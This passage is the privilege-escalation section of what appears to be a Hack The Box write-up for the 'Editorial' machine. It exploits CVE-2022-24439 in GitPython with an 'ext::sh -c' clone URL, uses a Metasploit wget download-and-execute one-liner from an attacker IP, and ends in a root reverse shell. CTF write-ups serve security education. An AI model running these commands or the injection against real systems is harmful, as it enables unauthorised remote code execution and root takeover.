+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>prod@editorial:~$ pip3 list | grep -i git
+</span></span><span style="display:flex;"><span>gitdb                 4.0.10
+</span></span><span style="display:flex;"><span>GitPython             3.1.29
+</span></span></code></pre></div><p><a href="https://www.cve.org/CVERecord?id=CVE-2022-24439"><strong>CVE-2022-24439</strong></a>
+According to <a href="https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858">SNYK</a>: Affected versions( &lt; 3.1.30) of <code>gitpython</code> package are vulnerable to Remote Code Execution (RCE) due to improper user input validation, which makes it possible to inject a maliciously crafted remote URL into the clone command. Exploiting this vulnerability is possible because the library makes external calls to <code>git</code> without sufficient sanitization of input arguments. This is only relevant when enabling the <code>ext</code> transport protocol.</p>
+<p><strong>PoC:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">from</span> git <span style="color:#ff79c6">import</span> Repo
+</span></span><span style="display:flex;"><span>r <span style="color:#ff79c6">=</span> Repo<span style="color:#ff79c6">.</span>init(<span style="color:#f1fa8c">&#39;&#39;</span>, bare<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#ff79c6">.</span>clone_from(<span style="color:#f1fa8c">&#39;ext::sh -c touch% /tmp/pwned&#39;</span>, <span style="color:#f1fa8c">&#39;tmp&#39;</span>, multi_options<span style="color:#ff79c6">=</span>[<span style="color:#f1fa8c">&#34;-c protocol.ext.allow=always&#34;</span>])
+</span></span></code></pre></div><p>We found our PE vector. To exploit it I used the <code>msfconsole</code>&rsquo;s web delivery module and set payload to <code>linux/x64/shell/reverse_tcp</code>. And I uploaded the payload to the <code>prod</code> user&rsquo;s home directory.</p>
+<p>Metasploit</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#ff79c6">(</span>multi/script/web_delivery<span style="color:#ff79c6">)</span> &gt; 
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Started reverse TCP handler on 10.10.14.50:4444 
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Using URL: http://10.10.14.50:8080/DHmVwiq
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Server started.
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Run the following <span style="color:#8be9fd;font-style:italic">command</span> on the target machine:
+</span></span><span style="display:flex;"><span>wget -qO kKqgpCZC --no-check-certificate http://10.10.14.50:8080/DHmVwiq; chmod +x kKqgpCZC; ./kKqgpCZC&amp; <span style="color:#8be9fd;font-style:italic">disown</span>
+</span></span></code></pre></div><p>Executing the payload using the exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>prod@editorial:~$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py <span style="color:#f1fa8c">&#39;ext::sh -c /home/prod/kKqgpCZC&#39;</span>
+</span></span></code></pre></div><p>Metasploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Run the following <span style="color:#8be9fd;font-style:italic">command</span> on the target machine:
+</span></span><span style="display:flex;"><span>wget -qO kKqgpCZC --no-check-certificate http://10.10.14.50:8080/DHmVwiq; chmod +x kKqgpCZC; ./kKqgpCZC&amp; <span style="color:#8be9fd;font-style:italic">disown</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> 10.129.76.145    web_delivery - Delivering Payload <span style="color:#ff79c6">(</span><span style="color:#bd93f9">250</span> bytes<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> 10.129.76.146    web_delivery - Delivering Payload <span style="color:#ff79c6">(</span><span style="color:#bd93f9">250</span> bytes<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Sending stage <span style="color:#ff79c6">(</span><span style="color:#bd93f9">38</span> bytes<span style="color:#ff79c6">)</span> to 10.129.76.146
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Command shell session <span style="color:#bd93f9">3</span> opened <span style="color:#ff79c6">(</span>10.10.14.50:4444 -&gt; 10.129.76.146:34428<span style="color:#ff79c6">)</span> at 2024-06-18 18:33:50 +0200
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#ff79c6">(</span>multi/script/web_delivery<span style="color:#ff79c6">)</span> &gt; sessions
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Active <span style="color:#8be9fd;font-style:italic">sessions</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">===============</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Id  Name  Type             Information  Connection
+</span></span><span style="display:flex;"><span>  --  ----  ----             -----------  ----------
+</span></span><span style="display:flex;"><span>  <span style="color:#bd93f9">3</span>         shell x64/linux               10.10.14.50:4444 -&gt; 10.129.76.146:34428 <span style="color:#ff79c6">(</span>
+</span></span><span style="display:flex;"><span>                                          10.129.76.146<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#ff79c6">(</span>multi/script/web_delivery<span style="color:#ff79c6">)</span> &gt; sessions -i <span style="color:#bd93f9">3</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Starting interaction with 3...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span>
+</span></span></code></pre></div><p>We successfully rooted the box.</p>
+]]></description></item></channel></rss>
